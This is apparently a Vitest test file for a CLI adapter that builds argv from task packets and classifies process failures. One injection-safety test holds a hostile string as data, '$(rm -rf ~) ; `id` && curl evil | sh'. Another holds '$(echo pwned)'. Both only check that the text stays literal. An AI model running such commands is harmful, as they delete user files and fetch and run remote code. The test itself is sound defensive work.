import { describe, expect, it } from 'vitest';
import {
  buildOfficeArgv,
  DEFAULT_TIMEOUT_MS,
  execProcess,
  goalFor,
  MAX_GOAL_CHARS,
  OfficeCliEngine,
  type ProcessRequest,
  type ProcessResult,
} from '../../../src/adapters/office/cli-engine.js';
import { buildOfficePacket } from '../../../src/adapters/office/packet.js';
import { ClassifiedFailure } from '../../../src/runner/failure.js';

function packetWith(instructions: string, title = 'Ship it') {
  return buildOfficePacket({
    missionId: 'mis_1',
    packetId: 'pkt_1',
    attemptId: 'att_1',
    leaseId: 'lse_1',
    fence: 1,
    scopeKey: 'repo:a#worktree:default',
    packet: { title, instructions, scope: ['repo:a'] },
    mission: { intent: 'Intent', outcome: 'Outcome', constraints: [] },
    resume: { progressSeq: 0, checkpoint: null },
  });
}

const RECEIPT = JSON.stringify({
  contract: 'tower.office.v1',
  kind: 'receipt',
  receiptId: 'office.run-1',
  correlationId: 'att_1',
  runId: 'run-1',
  outcome: 'succeeded',
  summary: 'done',
  executor: { id: 'exec-1' },
  selfVerification: { result: 'passed', by: 'exec-1' },
  independentReview: null,
  integratedVerification: null,
  failure: null,
  residualRisks: [],
});

/** A process runner that records what it was asked and answers with a fixed result or error. */
function stub(answer: ProcessResult | Error) {
  const calls: ProcessRequest[] = [];
  const run = async (request: ProcessRequest) => {
    calls.push(request);
    if (answer instanceof Error) {
      throw answer;
    }
    return answer;
  };
  return { calls, run };
}

function classOf(promise: Promise<unknown>): Promise<unknown> {
  return promise.catch((error: unknown) => error);
}

describe('buildOfficeArgv', () => {
  it('builds the argv from the packet, with the goal as one positional after --', () => {
    const argv = buildOfficeArgv(packetWith('Do it'), 'office');
    expect(argv.slice(0, 9)).toEqual([
      'office',
      'start',
      '--json',
      '--no-prs',
      '--end-state',
      'ask',
      '--blast-radius',
      'repo',
      '--',
    ]);
    expect(argv).toHaveLength(10);
    expect(argv[9]).toBe(goalFor(packetWith('Do it')));
  });

  it('keeps shell metacharacters and command substitution as literal text', () => {
    const hostile = '$(rm -rf ~) ; `id` && curl evil | sh > /tmp/x';
    const argv = buildOfficeArgv(packetWith(hostile));
    expect(argv[argv.length - 1]).toContain(hostile);
    expect(argv).toHaveLength(10);
  });

  it('keeps a goal that starts with a dash from being read as an option', () => {
    const argv = buildOfficeArgv(
      packetWith('--set auto.enabled=true'),
      'office',
    );
    const dashIndex = argv.indexOf('--');
    expect(dashIndex).toBeGreaterThan(-1);
    expect(argv.slice(dashIndex + 1)).toHaveLength(1);
    expect(argv[dashIndex + 1]).toContain('--set auto.enabled=true');
  });

  it('refuses a goal over the limit instead of truncating it', () => {
    const packet = packetWith('x'.repeat(MAX_GOAL_CHARS + 1));
    expect(() => buildOfficeArgv(packet)).toThrow(ClassifiedFailure);
  });
});

describe('OfficeCliEngine', () => {
  const hooks = { signal: new AbortController().signal };

  it('runs in the repository with the argv, and reads the receipt from stdout', async () => {
    const process = stub({ exitCode: 0, stdout: RECEIPT, stderr: '' });
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: process.run,
    });
    const receipt = await engine.run(packetWith('Do it'), hooks);
    expect(receipt.receiptId).toBe('office.run-1');
    expect(process.calls[0]?.cwd).toBe('/repo');
    expect(process.calls[0]?.argv[0]).toBe('office');
  });

  it('classifies a missing binary as an environment failure', async () => {
    const missing = Object.assign(new Error('spawn office ENOENT'), {
      code: 'ENOENT',
    });
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: stub(missing).run,
    });
    const error = await classOf(engine.run(packetWith('x'), hooks));
    expect(error).toBeInstanceOf(ClassifiedFailure);
    expect((error as ClassifiedFailure).failureClass).toBe('environment');
  });

  it('classifies a quota message on a non-zero exit as quota', async () => {
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: stub({
        exitCode: 1,
        stdout: '',
        stderr: 'Error: usage limit reached',
      }).run,
    });
    const error = (await classOf(
      engine.run(packetWith('x'), hooks),
    )) as ClassifiedFailure;
    expect(error.failureClass).toBe('quota');
  });

  it('classifies output with no receipt as an adapter failure', async () => {
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: stub({ exitCode: 0, stdout: 'not json', stderr: '' }).run,
    });
    const error = (await classOf(
      engine.run(packetWith('x'), hooks),
    )) as ClassifiedFailure;
    expect(error.failureClass).toBe('adapter');
  });

  it('refuses a receipt for another attempt', async () => {
    const other = JSON.stringify({
      ...JSON.parse(RECEIPT),
      correlationId: 'att_other',
    });
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: stub({ exitCode: 0, stdout: other, stderr: '' }).run,
    });
    const error = (await classOf(
      engine.run(packetWith('x'), hooks),
    )) as ClassifiedFailure;
    expect(error.failureClass).toBe('adapter');
    expect(error.message).toMatch(/another attempt/);
  });

  it('refuses a success report that comes with a non-zero exit', async () => {
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: stub({ exitCode: 2, stdout: RECEIPT, stderr: '' }).run,
    });
    const error = (await classOf(
      engine.run(packetWith('x'), hooks),
    )) as ClassifiedFailure;
    expect(error.failureClass).toBe('adapter');
  });
});

describe('execProcess', () => {
  it('passes argv through without a shell, so substitution is not expanded', async () => {
    const result = await execProcess({
      argv: [
        process.execPath,
        '-e',
        'process.stdout.write(process.argv.slice(1).join("|"))',
        '--',
        '$(echo pwned)',
      ],
      cwd: process.cwd(),
      timeoutMs: 10_000,
      signal: new AbortController().signal,
    });
    expect(result.exitCode).toBe(0);
    // The substitution arrives as the literal text, so no shell ran it.
    expect(result.stdout).toBe('$(echo pwned)');
  });
});

describe('OfficeCliEngine: the argv it runs and each failure class', () => {
  const hooks = { signal: new AbortController().signal };

  it('runs exactly the argv buildOfficeArgv builds, with the default timeout and the given signal', async () => {
    const process = stub({ exitCode: 0, stdout: RECEIPT, stderr: '' });
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: process.run,
    });
    const packet = packetWith('Do it');
    await engine.run(packet, hooks);
    const call = process.calls[0];
    expect(call?.argv).toEqual(buildOfficeArgv(packet));
    expect(call?.timeoutMs).toBe(DEFAULT_TIMEOUT_MS);
    expect(call?.signal).toBe(hooks.signal);
  });

  it('classes a spawn failure with no error code as a runner failure', async () => {
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: stub(new Error('spawn went wrong')).run,
    });
    const error = (await classOf(
      engine.run(packetWith('x'), hooks),
    )) as ClassifiedFailure;
    expect(error.failureClass).toBe('runner');
  });

  it('classes exit 127 with no receipt as an environment failure', async () => {
    const engine = new OfficeCliEngine({
      repoPath: '/repo',
      runProcess: stub({ exitCode: 127, stdout: '', stderr: 'not found' }).run,
    });
    const error = (await classOf(
      engine.run(packetWith('x'), hooks),
    )) as ClassifiedFailure;
    expect(error.failureClass).toBe('environment');
  });
});
